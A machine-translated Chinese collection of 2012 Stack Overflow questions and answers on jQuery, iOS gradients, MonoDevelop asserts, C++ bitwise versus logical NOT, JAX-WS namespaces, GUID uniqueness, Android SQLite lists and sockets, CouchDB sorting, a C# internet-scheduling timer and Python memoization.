[Android中的进度对话](http://blog.itadapter.com/2012/01/how-to-display-progress-message-aka.html#links)

# javascript - 如何避免重复创建 Jquery 包装器？

> ID：14074222
> 
> 赞同：4
> 
> 时间：2012-12-28T18:44:47.913
> 
> 标签：javascript, jquery

有什么办法可以避免`$("#check1")`在下面的语句中使用第二次？

```
$("#check1").prop("checked",!$("#check1").prop("checked")); 
```

通过任何技巧我可以做类似下面的事情吗？

```
$("#check1").prop("checked",!this.prop("checked")); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T18:48:54.380

如果您将函数作为回调传递，您将获得当前值。

```
$("#check1").prop("checked", function(i, value) {
    return !value;
}); 
```

`.prop( propertyName, function(index, oldPropertyValue) )`

*   `propertyNameThe name of the property to set.`
*   `function(index, oldPropertyValue) A function returning the value to set. Receives the index position of the element in the set and the old property value as arguments. Within the function, the keyword this refers to the current element.`

[参考](http://api.jquery.com/prop/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-28T18:46:50.967

```
var el = $("#check1");

el.prop("checked",!el.prop("checked")); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T18:46:21.773

```
var $check = $("#check1");
$check.prop( "checked", !$check.prop("checked") ); 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-12-28T18:48:20.737

您可以使用*它*，但通过这种方式：

```
$("#check1").prop("checked",!$(this).prop("checked")); 
```

# ios - 如何将 CAGradientLayer 添加到 UIButton

> ID：14074223
> 
> 赞同：3
> 
> 时间：2012-12-28T18:44:52.677
> 
> 标签：ios, uibutton, cagradientlayer

我正在尝试修改按钮的外观并花了很长时间试图弄清楚为什么我不能像下面这个简单的代码那样对其应用渐变：

```
[self.playButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
self.playButton.backgroundColor = [UIColor blackColor];

CAGradientLayer *gradient = [[CAGradientLayer alloc] init];
gradient.frame = self.playButton.bounds;
gradient.position = CGPointMake(self.playButton.bounds.size.width/2, self.playButton.bounds.size.height/2);
gradient.colors = [NSArray arrayWithObjects:
                   (id)[UIColor greenColor].CGColor,
                   (id)[UIColor redColor].CGColor,
                   nil];
gradient.locations = [NSArray arrayWithObjects:
                      [NSNumber numberWithFloat:0.0f],
                      [NSNumber numberWithFloat:1.0f],
                      nil];

[self.playButton.layer addSublayer:gradient]; 
```

它执行，但没有任何反应。我知道代码应该可以工作，因为许多其他人都在使用它，并且在更改`self.playButton`to时，`self.view`它会在`UIView`.

可能值得注意的是，我将自定义按钮定义为`IBOutlet`：

```
@property (weak, nonatomic) IBOutlet UIButton *playButton; 
```

任何帮助是极大的赞赏。

**更新和修复**

将按钮更改为使用可缩放图像而不是渐变时，我忘记重新注释掉渐变代码（在尝试[rokjarc](https://stackoverflow.com/users/653513/rokjarc)的想法之后）以及将按钮更改为`imageView.content`显示`UIViewContentModeScaleToFill`的渐变时......

```
self.playButton.imageView.contentMode = UIViewContentModeScaleToFill; 
```

所以谢谢[rokjarc](https://stackoverflow.com/users/653513/rokjarc)我想：D

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T18:56:30.613

简单地改变

```
self.playButton.backgroundColor = [UIColor blackColor]; 
```

至

```
self.playButton.backgroundColor = [UIColor clearColor]; 
```

刚刚测试，它的工作原理。

# c# - Debug.Assert 不会进入 MonoDevelop/MonoTouch 中的编辑器

> ID：14074224
> 
> 赞同：4
> 
> 时间：2012-12-28T18:44:54.060
> 
> 标签：c#, debugging, mono, monodevelop, assert

简单地说，`Debug.Assert`失败的调用不会停止 MonoDevelop 中程序的执行流程，它们只是打印出这样开始的跟踪消息（后面是堆栈跟踪）：

```
2012-12-28 19:21:01.978 TestApp[81689:c07] ---- DEBUG ASSERTION FAILED ----
2012-12-28 19:21:01.979 TestApp[81689:c07] ---- Assert Short Message ---- 
```

我能做些什么来强制在 MonoDevelop 中`Debug.Asserts`执行失败的中断？`Assert`

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-29T00:42:25.287

的调试器集成部分`Debug.Assert`尚未实现 - 请参阅[Xamarin 错误 #4650](https://bugzilla.xamarin.com/show_bug.cgi?id=4650)。

几个月前我已经对此进行了快速浏览，然后意识到正确执行此操作可能需要运行时支持以自动展开顶部帧（因此 MonoDevelop 将停止在`Debug.Assert`语句上，而不是在跟踪侦听器实现中的某个位置）。

作为一种解决方法，您可以添加自定义跟踪侦听器并调用`Debugger.Break()`.

# c++ - c++中布尔类型的奇怪行为

> ID：14074232
> 
> 赞同：1
> 
> 时间：2012-12-28T18:45:49.653
> 
> 标签：c++

我的代码中有以下 if 语句：

```
~(( APQState  == dot11->tempState[0] ) &&
  ( STAQState == dot11->tempState[1] ) &&
  ( tempk1    == dot11->tempState[2] ) &&
  ( tempk2    == dot11->tempState[3] ) &&
  ( tempk3    == dot11->tempState[4] )) 
```

假设布尔变量，

```
B = ( APQState  == dot11->tempState[0] ) &&
    ( STAQState == dot11->tempState[1] ) &&
    ( tempk1    == dot11->tempState[2] ) &&
    ( tempk2    == dot11->tempState[3] ) &&
    ( tempk3    = =dot11->tempState[4] ) 
```

即使 B 为真（=> ~B 为假），也会评估 if 语句。
我在执行时检查了循环内 B 的值。我得到 B=1;

奇怪的是，当我尝试计算 (~B ) 的值时，它显示的值为 2。（即当 B = 1 时）。

为什么会这样？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T18:49:54.280

确保你知道你想要什么。

`~` 是位运算符来翻转所有位。

`!`是“NOT”的逻辑运算符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T18:50:34.343

将 ~B 更改为 !B。这应该有希望工作

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T18:52:29.057

C++ 中的波浪号 (~) 是[按位非运算符](http://en.wikipedia.org/wiki/Bitwise_NOT#NOT)。这与逻辑非运算符 (!) 不同。

`~B`并不总是相等`!B`

# java - 为什么 JAX-WS 服务器端会更改 SOAP 正文部分内的名称空间？

> ID：14074237
> 
> 赞同：0
> 
> 时间：2012-12-28T18:46:45.383
> 
> 标签：java, namespaces, jax-ws, server-side

我正在尝试对 Web 服务使用自定义签名。这个想法是在服务器和客户端添加一个处理程序，以创建/验证自定义签名。假设整个应该签名。

问题是 JAX WS 服务器端在接收到 SOAP 请求**后改变了（通过添加/重复命名空间声明）。**

以下是由 TCP/IP Monitor 在服务器端捕获的简化 SOAP 请求：

```
<?xml version="1.0"  standalone="no"?>
  <S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
    <S:Body>
      <ns2:getServerName xmlns:ns2="http://ws.example.com/">
        <arg0>someText</arg0>
      </ns2:getServerName>
    </S:Body>
  </S:Envelope> 
```

服务器端只有一个处理程序处于活动状态，第一个操作是漂亮的格式输出：

```
 public boolean handleMessage(SOAPMessageContext context) {

        try {
            SOAPMessage soapMsg = context.getMessage();                     
            SOAPEnvelope soapEnv = soapMsg.getSOAPPart().getEnvelope();
            nodeToPrettyFormat(soapEnv, null); //just a System.out in pretty format 
```

结果输出是：

```
<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
  <S:Header/>
  <S:Body>
      <ns2:getServerName
          xmlns:S="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns2="http://ws.example.com/">
        <arg0>someText</arg0>
      </ns2:getServerName>
  </S:Body>
</S:Envelope> 
```

如您所见，元素的 xmlns:S="http://schemas.xmlsoap.org/soap/envelope/ 是重复的。这会使包括元素在内的任何签名无效。

所以，

*   为什么会这样？
*   可以预防吗？
*   有没有更好的主意如何应用自定义签名（通常）？

谢谢你。

# c# - Guid 在不同机器上的唯一性

> ID：14074238
> 
> 赞同：13
> 
> 时间：2012-12-28T18:46:46.393
> 
> 标签：c#, sql-server, programming-languages, operating-system, guid

> **可能重复：**
> [GUID 是否 100% 都是唯一的？](https://stackoverflow.com/questions/39771/is-a-guid-unique-100-of-the-time)

在阅读了关于 Guid 的所有帖子之后，我仍然不清楚一件简单的事情：

不同机器生成的指南也保持其唯一性。

我已经阅读过关于单机上的 guid 唯一性，但我仍然不知道不同机器上的唯一性

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-28T18:48:11.717

**人们普遍认为，新的随机 GUID 始终是唯一的。从概率上看，这不是真的，但是产生欺骗的可能性是如此之小，我们不需要关心它。**

生成两个相同 guid 的几率是 5,316,911,983,139,663,491,615,228,241,121,400,000 分之一

因此，如果您在 100 万台计算机上生成 100 万个 guid，则生成副本的几率为：5,316,911,983,139,663,491,615,228 分之一

以 10 亿台计算机上的 10 亿个 guid 为例，产生欺骗的几率为：5,316,911,983,139,663,491 分之一（即 5.3 万亿分之一）。

数字不言自明，你不会产生欺骗。

如果您想知道我从哪里得到这些数字，GUID 的值部分是 122 位。2^122 是 5.3169119831396634916152282411214 x 10^36

一些更疯狂的数字......
如果您每秒生成 100 万个 guid，则可能需要 168,486,464,147,580,370,470,736 年才能保证重复。

@viggity 提到一些 guid 有 48 位由 mac 地址占用，数字仍然惊人，因此*丢失*这些位的承受能力。以上面每秒 200 万个 guid 的例子（在同一台计算机上），仍然需要 598,584,166 年才能保证被骗。那是6亿年。这比地球上存在的生命还要长。或者如果你是一个年轻的地球创造论者，那至少是地球寿命的六万倍。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-28T18:49:11.540

GUID“实际上”是***普遍***唯一的。

> GUID 是一个 128 位整数（16 个字节），可以在需要唯一标识符的所有计算机和网络中使用。这样的标识符被复制的概率非常低。

来自[MSDN](http://msdn.microsoft.com/en-us/library/system.guid.aspx)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-28T18:57:31.120

我记得在某处听说过，如果您将 IPV4 地址空间（32 位）想象为邮票的大小，那么 IPV6（128 位）就是我们太阳系的大小。产生欺骗是不会发生的。

此外，如果有任何事情，您更有可能获得重复的同一台机器而不是两台不同的机器，因为大多数 Guid 生成算法会将您的计算机 NIC MAC 地址嵌入到 guid 中（它是 48 位）。虽然有些算法不嵌入 MAC 地址，只是纯粹随机的。见： http: [//guid.us/](http://guid.us/)

编辑：另一个有趣的比例示例，地球的体积约为 10^27 立方厘米。这意味着地球整个体积的每立方厘米都可以拥有 340,000,000,000 guid。这个数字大得令人难以置信。

或者，地球表面的每平方纳米表本身可能有大约 650,000 个 guid。

# android - 这是从数据库中填充 ListView 的一种可能方法吗？

> ID：14074242
> 
> 赞同：1
> 
> 时间：2012-12-28T18:47:08.033
> 
> 标签：android, sqlite, android-listview

我一直在尝试以不同的方式填充我的列表视图。我的数据库类已经定义了一个返回游标的函数。我想知道我的方式是否可行？截至目前，当我尝试访问 ListView 时，我的应用程序崩溃了。这是代码：

```
public class ProjectExplorer extends ListActivity {

private projectdatabase database;
protected Cursor cursor;
protected ListAdapter adapter;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    //setContentView(R.layout.activity_project_explorer);

    openDatabase();
}

private void openDatabase() {

    database.open();
    cursor = database.getDataforDisplay();
    adapter = new SimpleCursorAdapter(this, android.R.layout.simple_list_item_1, cursor, null, null, 0);
    setListAdapter(adapter);

}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.activity_project_explorer, menu);
    return true;
}     } 
```

返回游标的方法的代码：

```
public Cursor getDataforDisplay () {        

    String[] columns = new String[] {KEY_ROWID, PROJECT_NAME, PROJECT_FINISH_DATE, PROJECT_DIFFICULTY, PROJECT_STATUS};
    Cursor c = projectDatabase.query(DATABASE_TABLE, columns, null, null, null, null, null);

    return c;

} 
```

根据要求，完成数据库类代码：

```
public class projectdatabase {

public static final String KEY_ROWID = "_id";
public static final String PROJECT_NAME = "project_name";
public static final String PROJECT_ID = "project_id";
public static final String PROJECT_DIFFICULTY = "project_difficulty";
public static final String PROJECT_STATUS = "project_status";
public static final String PROJECT_START_DATE = "project_start_date";
public static final String PROJECT_FINISH_DATE = "project_finsish_date";

private static final String DATABASE_NAME = "project_db";
static final String DATABASE_TABLE = "project_details";
private static final int DATABASE_VERSION = 1;

private DbHelper ourHelper;
private final Context projectdbContext;
private SQLiteDatabase projectDatabase;

private static class DbHelper extends SQLiteOpenHelper {
    public DbHelper(Context context) {

        super(context, DATABASE_NAME, null, DATABASE_VERSION);

    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        // TODO Auto-generated method stub

        db.execSQL("CREATE TABLE "+ DATABASE_TABLE + " (" +
                KEY_ROWID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
                PROJECT_NAME + " TEXT NOT NULL, " +
                PROJECT_ID + " INTEGER, " +
                PROJECT_START_DATE + " TEXT, " +
                PROJECT_FINISH_DATE + " TEXT, " +
                PROJECT_DIFFICULTY + " TEXT, " +
                PROJECT_STATUS + " TEXT);"
               ); 

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // TODO Auto-generated method stub

        db.execSQL("DROP TABLE IF EXIST " + DATABASE_NAME);
        onCreate(db);

    }
}

public projectdatabase (Context c) {                            
     projectdbContext = c;
}

public projectdatabase open() {                                                 //Open database
    ourHelper = new DbHelper(projectdbContext);
    projectDatabase = ourHelper.getWritableDatabase();
    return this;
}

public void close() {                                                           //Close database
    ourHelper.close();
}

public long createEntry(String name, String pid, String startdate, String finishdate, String difficulty) {          //Enter project data into database

    ContentValues cv = new ContentValues();
    cv.put(PROJECT_NAME, name);
    cv.put(PROJECT_ID, pid);
    cv.put(PROJECT_START_DATE, startdate);
    cv.put(PROJECT_FINISH_DATE, finishdate);
    cv.put(PROJECT_DIFFICULTY, difficulty);

    return projectDatabase.insert(DATABASE_TABLE, null, cv);
}

public String getData() {                                                       //Retrieve all project data

    String[] columns = new String[] {KEY_ROWID, PROJECT_NAME, PROJECT_ID, PROJECT_START_DATE, PROJECT_FINISH_DATE, PROJECT_DIFFICULTY, PROJECT_STATUS};
    Cursor c = projectDatabase.query(DATABASE_TABLE, columns, null, null, null, null, null);
    String result = "";

    int iRow = c.getColumnIndex(KEY_ROWID);
    int iName = c.getColumnIndex(PROJECT_NAME);
    int iID = c.getColumnIndex(PROJECT_ID);
    int iStartDate = c.getColumnIndex(PROJECT_START_DATE);
    int iFinishDate = c.getColumnIndex(PROJECT_FINISH_DATE);
    int iDifficulty = c.getColumnIndex(PROJECT_DIFFICULTY);
    int iStatus = c.getColumnIndex(PROJECT_STATUS);

    for(c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {

        result = result + c.getString(iRow) + "|" + c.getString(iName) + "|" + c.getString(iID) + "|" + c.getString(iStartDate) + "|" + c.getString(iFinishDate) + "|" + c.getString(iDifficulty) + "|" + c.getString(iStatus) + "\n";

    }

    return result;
}

public Cursor getDataforDisplay () {        //Display selected data for 'User profile' *Incomplete*

    String[] columns = new String[] {KEY_ROWID, PROJECT_NAME, PROJECT_FINISH_DATE, PROJECT_DIFFICULTY, PROJECT_STATUS};
    Cursor c = projectDatabase.query(DATABASE_TABLE, columns, null, null, null, null, null);

    c.moveToFirst();
    return c;

} 
```

}

日志猫：

当我在 AVD 中运行项目时出现此错误：

```
12-29 00:35:14.333: E/dalvikvm(4804): Unable to open stack trace file '/data/anr/traces.txt': Permission denied 
```

然后，当我打开应该显示 ListView 但应用程序崩溃的活动时：

```
12-29 00:38:04.245: E/AndroidRuntime(4804): FATAL EXCEPTION: main
12-29 00:38:04.245: E/AndroidRuntime(4804): java.lang.RuntimeException: Unable to start      
activity ComponentInfo{com.kk.project/com.kk.project.ProjectExplorer}:     
java.lang.IllegalArgumentException: column 'name' does not exist
12-29 00:38:04.245: E/AndroidRuntime(4804):     at     
android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
android.app.ActivityThread.access$600(ActivityThread.java:123)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at 
android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at 
android.os.Handler.dispatchMessage(Handler.java:99)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at 
android.os.Looper.loop(Looper.java:137)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at   
android.app.ActivityThread.main(ActivityThread.java:4424)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
java.lang.reflect.Method.invokeNative(Native Method)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
java.lang.reflect.Method.invoke(Method.java:511)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
dalvik.system.NativeStart.main(Native Method)
12-29 00:38:04.245: E/AndroidRuntime(4804): Caused by: 
java.lang.IllegalArgumentException: column 'name' does not exist
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
android.database.AbstractCursor.getColumnIndexOrThrow(AbstractCursor.java:267)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at 
android.support.v4.widget.SimpleCursorAdapter.findColumns(SimpleCursorAdapter.java:317)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at 
android.support.v4.widget.SimpleCursorAdapter.<init>(SimpleCursorAdapter.java:92)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at   
com.kk.project.ProjectExplorer.openDatabase(ProjectExplorer.java:29)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at   
com.kk.project.ProjectExplorer.onCreate(ProjectExplorer.java:21)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
android.app.Activity.performCreate(Activity.java:4465)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
12-29 00:38:04.245: E/AndroidRuntime(4804):     at  
android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
12-29 00:38:04.245: E/AndroidRuntime(4804):     ... 11 more 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T18:56:53.843

您需要在尝试使用数据库之前对其进行初始化。

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    //setContentView(R.layout.activity_project_explorer);
    database=new projectdatabase(ProjectExplorer.this);
    openDatabase();
} 
```

**编辑 ：**

```
adapter = new SimpleCursorAdapter(this, android.R.layout.simple_spinner_item, cursor, new String[] { "project_name" }, new int[] { android.R.id.text1 }, 0); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T18:57:54.977

是的，它是正确的方式，但你错过了一件事。您需要将列从光标映射到正确的 UI 字段，如下所示：

```
SimpleCursorAdapter scaCity = new SimpleCursorAdapter(this, android.R.layout.simple_spinner_item, cursor, new String[] { "name" }, new int[] { android.R.id.text1 }, 0); 
```

同样在返回光标之前的函数 getDataForDisplay() 中，调用：

```
c.moveToFirst(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T19:18:40.503

您是否考虑过使用装载机？它们专门设计用于显示数据库中的数据并填充列表。做了很多很棒的事情，比如显示第一个结果，而其余的仍然从 DB 中返回，等等。

[http://developer.android.com/guide/components/loaders.html](http://developer.android.com/guide/components/loaders.html)

可能不是您问题的直接答案，但非常值得考虑。祝你好运。

# couchdb - 按日期排序的 CouchDB 视图排序规则

> ID：14074243
> 
> 赞同：0
> 
> 时间：2012-12-28T18:47:14.537
> 
> 标签：couchdb

我正在使用一个 couchDB 数据库。

我可以按类别获取所有文档，并使用 ["category","document_id"] `and a query like`startkey=["category","document_id"]&endkey=["category",{}]` 之类的键对结果进行分页

现在我想按日期对这些结果进行排序，以便首先获得最新的文档。

我尝试了很多键，例如`["category","date","document_id"]` 但没有任何效果（或者我无法让它工作）。

我会使用类似的东西 `startkey=["queried_category","queried_date","queried_document_id"]&endkey=["queried_category"]`

但忽略“queried_date”关键部分（排序但不采用“document_id”>“queried_document_id”的文档）

编辑：示例：使用如下键： `startkey=["apple","2012-12-27","ZZZ"]&endkey=["apple",{}]&descending=true`

我会有（这是正常行为）

```
"apple","2012-12-27","ABC"
"apple","2012-05-01","EFG"
 ...
"apple","2012-02-13","ZZZ"
... 
```

但我想要的结果集应该从 `"apple","2012-02-13","ZZZ"`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-29T11:41:26.447

使用时间戳而不是文档 ID 进行分页的问题是时间戳不是唯一的。这就是为什么您在分页 Aurélien 的解决方案时会遇到问题。

我会坚持你的尝试，但使用时间戳作为数字（自 1970 年以来的标准 UNIX 毫秒）。您可以通过乘以来反转单个数字字段的顺序`-1`：

```
emit(category, -timestamp, doc_id) 
```

这种按字典顺序（升序）排序的结果将根据您的需要进行排序：

1.  第一次约会降序，
2.  然后文档 id 升序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:45:40.417

发出类别和时间戳（您不需要 document_id）：

```
emit(category, timestamp); 
```

然后过滤类别：

```
?startkey=[":category"]&endkey=[":category",{}] 
```

你必须明白这只是一种排序，所以你需要`startkey`在第一行之前，`endkey`在最后一行之后。

最后但并非最不重要的一点是，不要忘记有一个足以满足排序要求的时间戳表示。

# c# - 使用计时器禁用在特定日期启用互联网访问

> ID：14074246
> 
> 赞同：0
> 
> 时间：2012-12-28T18:47:44.130
> 
> 标签：c#

在我的项目中，我可以在特定时间但在当前日期完全阻止互联网访问。我通过使用计时器来做到这一点。该计时器检查开始时间和结束时间，并控制每 5 秒使用用户提供的开始时间和结束时间来禁用和启用互联网连接。现在我想在不同的日子里做同样的事情，不仅是在当前日期。如果用户为该特定日期提供了禁用/启用时间间隔，我想通过计时器在一天中的每 5 秒内检查每一天。

```
 if (currentDate == chosenDate)
        {
            if ((currenttime >= starttime) && (currenttime <= endtime))
            {
                timerForHour.Enabled = true;
                if (isConnectedToNetwork)
                {
                    findNetworkName();
                    Disable(networkName);
                }

            }
            else
            {
                exitFlag = true;
                Enable(networkName);
            }

        }

        else if(currentDate!=chosenDate)
        {

        } 
```

这是我的代码，我将在 else if 部分做什么？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T22:59:50.697

我认为你正在以错误的方式解决这个问题。不要用“是否是今天”来思考它，而是以更一般的方式思考它：“当天是否匹配，如果匹配，那么我们是否在可接受的时间范围内？”。在不了解如何存储您使用的日期/时间范围的更多信息的情况下，我可以使用 LINQ 提供以下内容：

```
IsInternetAllowed = false;
DateTime dateOfInterest = datesToRestrict
    .FirstOrDefault(dt => dt.Date == DateTime.Now.Date);
if (dateOfInterest != null)
{
    if (timesToAllowDict.ContainsKey(DateTime.Now.Date))
    {
        List<Tuple<DateTime, DateTime>> lstAllowed = 
            timesToAllowDict[DateTime.Now.Date];

        IsInternetAllowed = lstAllowed  
            .FirstOrDefault(time => 
                DateTime.Now.Time > time.Value1 &&
                DateTime.Now.Time < time.Value2) != null;
    }
}

if (IsInternetAllowed)
    Enable(networkName);
else
    Disable(networkName); 
```

* * *

我对您的数据做出以下假设：

1.  每天可能允许多次。
2.  任何时候不允许网络访问，它都会被禁用。
3.  您将允许的日期和时间存储在
    `Dictionary<DateTime, List<Tuple<DateTime, DateTime>>>`结构中。
4.  该结构表示日期，允许的时间列表（开始然后结束）。
5.  每天单独添加（每天允许一个字典键）。

很可能通过一些简化，您可以消除对字典结构的需要，而只使用开始和结束时间。

# android - 被VM杀死的Android客户端套接字

> ID：14074248
> 
> 赞同：0
> 
> 时间：2012-12-28T18:47:56.323
> 
> 标签：android, sockets

我正在创建一个应用程序，用于连接到连接到 mysql 数据库的 java 实现的服务器，从服务器端一切正常，在 android 上每次我连接到服务器时我都可以发送消息但是当读取响应套接字时关闭，我想问题来自杀死线程的VM，我google'it并尝试将套接字类作为活动运行，然后作为线程我什至尝试优先考虑线程，但我总是得到相同的错误：

```
12-28 18:28:24.769: W/System.err(1342): java.net.SocketException: Socket closed
12-28 18:28:24.769: W/System.err(1342):     at org.apache.harmony.luni.platform.OSNetworkSystem.read(Native Method)
12-28 18:28:24.769: W/System.err(1342):     at dalvik.system.BlockGuard$WrappedNetworkSystem.read(BlockGuard.java:273)
12-28 18:28:24.769: W/System.err(1342):     at org.apache.harmony.luni.net.PlainSocketImpl.read(PlainSocketImpl.java:458)
12-28 18:28:24.769: W/System.err(1342):     at org.apache.harmony.luni.net.SocketInputStream.read(SocketInputStream.java:59)
12-28 18:28:24.769: W/System.err(1342):     at java.io.DataInputStream.readLine(DataInputStream.java:310)
12-28 18:28:24.769: W/System.err(1342):     at com.example.lightreading.ConnectionDB$clientCon.run(ConnectionDB.java:83)
12-28 18:28:24.769: W/System.err(1342):     at java.lang.Thread.run(Thread.java:1019) 
```

这是我使用线程的代码：

```
public class ConnectionDB{

public static String ip;
public static int port;
private static ConnectionDB instance = null;

private StringBuilder sb;
private String response = "";
private String data;

public static ConnectionDB getInstance() {
      if(instance == null) {
         instance = new ConnectionDB();
      }
      return instance;
}

public String connect(String s_send) throws InterruptedException{
    data = s_send;
    Thread cThread = new Thread(new clientCon());
    cThread.setPriority(Thread.MAX_PRIORITY);
    cThread.start();

    return response.toString();
}

class clientCon implements Runnable {

    private Socket socket = null;
    private DataOutputStream dataOutputStream = null;
    private DataInputStream dataInputStream = null;
    @Override
    public void run() {
        // TODO Auto-generated method stub
        try {
              socket = new Socket(ip,port);
              dataOutputStream = new DataOutputStream(socket.getOutputStream());
              dataInputStream = new DataInputStream(socket.getInputStream());
              Log.d("sending msg: ",data);
              dataOutputStream.writeBytes(data);
              dataOutputStream.flush();
              dataOutputStream.close();
              Log.d("msg sent: ", data);

              while ((data = dataInputStream.readLine()) != null) {
                    Log.d("data from server: ", data);
                    sb.append(data);
              }
              Log.d("msg received: ", sb.toString());
             } catch (UnknownHostException e) {
              // TODO Auto-generated catch block
              e.printStackTrace();
             } catch (IOException e) {
              // TODO Auto-generated catch block
              e.printStackTrace();
             }
        if (sb != null){
            response = sb.toString();
            Log.d("Response from server: ", response);
        }else{
            Log.d("Response from server is null", "");
        }

    }

} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-01T18:42:38.763

我有同样的问题，你必须 socket.shutdownOutput(); 为了让套接字准备好传输数据

# python - 高效的通用 Python memoize

> ID：14074249
> 
> 赞同：3
> 
> 时间：2012-12-28T18:47:57.307
> 
> 标签：python, memoization

我有一个通用的 Python 记忆器：

```
cache = {}

def memoize(f): 
    """Memoize any function."""

    def decorated(*args):
        key = (f, str(args))
        result = cache.get(key, None)
        if result is None:
            result = f(*args)
            cache[key] = result
        return result

    return decorated 
```

它有效，但我对此并不满意，因为有时它效率不高。最近，我将它与一个将列表作为参数的函数一起使用，显然用整个列表制作键会减慢一切。最好的方法是什么？（即，有效地计算键，无论参数是什么，无论它们有多长或多复杂）

我想这个问题实际上是关于如何有效地从 args 和通用记忆器的函数生成密钥 - 我在一个程序中观察到糟糕的密钥（生产成本太高）对运行时产生了重大影响。我的 prog 使用 'str(args)' 需要 45 秒，但我可以使用手工制作的键将其减少到 3 秒。不幸的是，手工制作的密钥是特定于这个程序的，但我想要一个快速的记忆器，我不必每次都为缓存推出特定的手工制作的密钥。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-28T20:02:07.203

首先，如果您非常确定`O(N)`散列在这里是合理且必要的，并且您只想使用比 更快的算法来加快速度`hash(str(x))`，请尝试以下操作：

```
def hash_seq(iterable):
    result = hash(type(iterable))
    for element in iterable:
        result ^= hash(element)
    return result 
```

当然，这不适用于可能很深的序列，但有一个明显的方法：

```
def hash_seq(iterable):
    result = hash(type(iterable))
    for element in iterable:
        try:
            result ^= hash(element)
        except TypeError:
            result ^= hash_seq(element)
    return result 
```

我不认为这是一个足够好的哈希算法，因为它会为同一个列表的不同排列返回相同的值。但我很确定没有足够好的哈希算法会更快。至少如果它是用 C 或 Cython 编写的，如果这是你要走的方向，你最终可能会想要这样做。

此外，值得注意的是，这在`str`(or `marshal`) 不正确的许多情况下是正确的——例如，如果您`list`可能有一些可变元素`repr`涉及它`id`而不是它的值。但是，它仍然不是在所有情况下都是正确的。特别是，它假设“迭代相同的元素”意味着任何可迭代类型的“相等”，这显然不能保证是真的。假阴性不是什么大问题，但假阳性是（例如，`dict`具有相同键但不同值的两个 s 可能会虚假地比较相等并共享一个备忘录）。

此外，它不使用额外的空间，而不是使用相当大的乘数的 O(N)。

无论如何，值得先尝试一下，然后才决定是否值得分析它的足够好和调整微优化。

这是浅层实现的一个简单的 Cython 版本：

```
def test_cy_xor(iterable):
    cdef int result = hash(type(iterable))
    cdef int h
    for element in iterable:
        h = hash(element)
        result ^= h
    return result 
```

通过快速测试，纯 Python 实现非常慢（正如您所料，与 C 循环 in `str`and相比，所有 Python 循环`marshal`），但 Cython 版本很容易获胜：

```
 test_str(    3):  0.015475
test_marshal(    3):  0.008852
    test_xor(    3):  0.016770
 test_cy_xor(    3):  0.004613
    test_str(10000):  8.633486
test_marshal(10000):  2.735319
    test_xor(10000): 24.895457
 test_cy_xor(10000):  0.716340 
```

仅在 Cython 中迭代序列并且什么都不做（实际上只是 N 次调用`PyIter_Next`和一些引用计数，因此您在本机 C 中不会做得更好）与`test_cy_xor`. 您可以通过要求实际序列而不是可迭代来使其更快，甚至通过要求 a 来加快速度`list`，尽管无论哪种方式都可能需要编写显式 C 而不是 Cython 才能获得好处。

